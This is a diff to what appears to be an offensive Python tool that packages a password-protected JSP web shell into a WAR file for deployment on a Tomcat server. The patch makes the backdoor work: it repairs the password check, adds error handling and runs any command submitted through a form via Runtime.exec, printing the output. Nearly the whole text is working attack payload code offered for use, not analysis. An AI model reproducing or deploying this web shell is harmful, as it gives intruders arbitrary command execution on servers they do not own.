@@ -93,7 +93,7 @@ Created-By: %s (Sun Microsystems Inc.)
     os.chdir(dirpath)
     outpath = tempfile.gettempdir() + '/' + appname + '.war'
     logging.info('Generating WAR file at: "%s"' % outpath)
-    packing = commands.getstatusoutput('jar -cvf %s files/*' % outpath)
+    packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
     os.chdir(cwd)
 
     print packing[1]
@@ -107,65 +107,65 @@ Created-By: %s (Sun Microsystems Inc.)
 
 def preparePayload(opts):
     logging.info('Generating JSP WAR backdoor code...')
-
-    if opts.shellpass.lower() == 'none':
-        passwordField = 'none'
-    else:
-        passwordField = ''
-
     logging.warning('JSP Backdoor password set to: >>> "%s" <<<' % opts.shellpass)
-    payload = '''<%%@ page import="java.util.*,java.io.*"%%>
-<%%!
-    public String execute(String cmd) {
+
+    payload = '''<%%@ page import="java.util.*,java.io.*"%%> <%%!
+    public String execute(String pass, String cmd) {
         final String hardcodedPass = "%(password)s";
-        String out = "";
-        String pass = request.getParameter('password');
+        StringBuilder res = new StringBuilder();
 
-        if (cmd != null && (pass == hardcodedPass || hardcodedPass.toLowerCase() == "none"))) {
-            Process proc = Runtime.getRuntime().exec(cmd);
-            OutputStream outs = proc.getOutputStream();
-            InputStream ins = proc.getInputStream();
-            DataInputStream datains = new DataInputStream(ins);
-            String datainsline = datains.readLine();
+        if (cmd != null && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
+            try {
+                Process proc = Runtime.getRuntime().exec(cmd);
+                OutputStream outs = proc.getOutputStream();
+                InputStream ins = proc.getInputStream();
+                DataInputStream datains = new DataInputStream(ins);
+                String datainsline = datains.readLine();
 
-            while ( datainsline != null) {
-                out += datainsline;
-                datainsline = datains.readLine();
+                while ( datainsline != null) {
+                    res.append(datainsline);
+                    datainsline = datains.readLine();
+                }
+            } catch( IOException e) {
+                return "IOException: " + e.getMessage();
             }
         }
+        else {
+            return "Wrong password or no command issued.";
+        }
 
-        return out;
+        return res.toString();
     }
-%%>
-<!DOCTYPE html>
+%%><!DOCTYPE html>
 <html>
     <head>
-        <title>%(title)s</title>
+        <title>JSP Application</title>
     </head>
     <body>
-        <form method=get name=cmd>
+        <form method=post>
         <table>
             <tr>
-                <td>Password:</td><td><input type=password width=40 name="password" value="%(password2)s" onclick='this.value=""'/></td>
+                <td>Password:</td><td><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
             </tr>
             <tr>
-                <td><%%= execute("whoami") %%>@<%%= execute("hostname") %%> $ </td><td><input type=text width=160 name="cmd" value="uname -a" onclick='this.value=""'/></td>
+                <td>tomcat $ </td><td><input type=text width=160 name="cmd" value="uname -a" onclick='this.value=""'/></td>
             </tr>
             <tr>
                 <td><input type=submit name=submit value="Execute" /></td><td></td>
             </tr>
         </table>
+        </form>
         <hr />
         <pre>
         <%%
-            if (request.getParameter('cmd') != null) {
-                out.println(execute(request.getParameter('cmd')));
+            if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
+                out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
             }
         %%>
         </pre>
         <br />
     </body>
-</html>''' % {'title': opts.title, 'password2': passwordField, 'password': opts.shellpass }
+</html>''' % {'title': opts.title, 'password': opts.shellpass }
 
     return payload
 
